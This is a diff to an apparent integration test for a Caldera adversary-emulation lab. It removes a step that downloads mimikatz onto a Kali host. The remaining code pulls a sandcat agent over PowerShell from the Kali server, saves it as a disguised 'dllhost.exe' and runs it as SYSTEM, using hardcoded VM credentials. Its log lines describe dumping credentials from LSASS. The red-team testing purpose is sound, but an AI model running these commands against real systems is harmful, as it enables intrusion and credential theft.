@@ -226,8 +226,6 @@ async function testFullPipeline() {
   const group = `test-${Date.now()}`
   const taskName = `CalderaSandcat-${group}`
 
-  const kaliPrereq = `if [ -f "\\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe" ]; then echo "ALREADY_PRESENT: \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe"; else mkdir -p \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64 && wget -q "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -O /tmp/mimikatz.zip && unzip -o /tmp/mimikatz.zip -d /tmp/mimikatz && cp /tmp/mimikatz/x64/mimikatz.exe \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe && rm -rf /tmp/mimikatz.zip /tmp/mimikatz && sudo systemctl restart caldera; fi`
-
   let agentPaw = null
 
   try {
@@ -250,25 +248,8 @@ async function testFullPipeline() {
     } catch {}
     console.log("    => clean")
 
-    // ── Step 2: Install prereqs on Kali ──
-    console.log("\n  [2/7] Running kali prereq (mimikatz download + Caldera restart)...")
-    const prereqResult = await sshRun(KALI_IP, "kali", "kali", kaliPrereq)
-    console.log(`    => ${prereqResult.slice(0, 200)}`)
-    if (!prereqResult.includes("ALREADY_PRESENT")) {
-      console.log("    => Caldera was restarted, waiting to come back (120s timeout)...")
-      const start = Date.now()
-      while (Date.now() - start < 120000) {
-        try {
-          await calderaRest("POST", { index: "agents" })
-          console.log(`    => Caldera ready after ${Math.round((Date.now() - start) / 1000)}s`)
-          break
-        } catch {}
-        await new Promise(r => setTimeout(r, 1000))
-      }
-    }
-
-    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
-    console.log(`\n  [3/7] Deploying sandcat as SYSTEM (group=${group})...`)
+    // ── Step 2: Deploy sandcat via Scheduled Task as SYSTEM ──
+    console.log(`\n  [2/7] Deploying sandcat as SYSTEM (group=${group})...`)
     const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
       `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
     console.log(`    => download: ${dlResult.trim()}`)
@@ -493,9 +474,8 @@ async function main() {
   console.log(`\n  Mimikatz ability specifics:`)
   console.log(`    - Offline credential theft: loads existing LSASS dump then extracts hashes with sekurlsa::logonpasswords`)
   console.log(`    - Does NOT dump LSASS itself — test prepends nanodump to create %tmp%\\lsass.DMP first`)
-  console.log(`    - mimikatz.exe deployed to C:\\Users\\Public\\x64\\ (matches ability's PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\ pattern)`)
-  console.log(`    - nanodump.x64.exe deployed to C:\\Users\\Public\\ for creating prerequisite dump`)
-  console.log(`    - kali_prereq downloads mimikatz_trunk.zip from GitHub, extracts x64/mimikatz.exe, restarts Caldera`)
+    console.log(`    - mimikatz.exe deployed to C:\\Users\\Public\\x64\\ (win_prereq handles download)`)
+    console.log(`    - nanodump.x64.exe deployed to C:\\Users\\Public\\ for creating prerequisite dump`)
   console.log(`    - Agent runs as SYSTEM (Scheduled Task) for SeDebugPrivilege`)
   console.log(`    - No EULA acceptance needed`)
 }
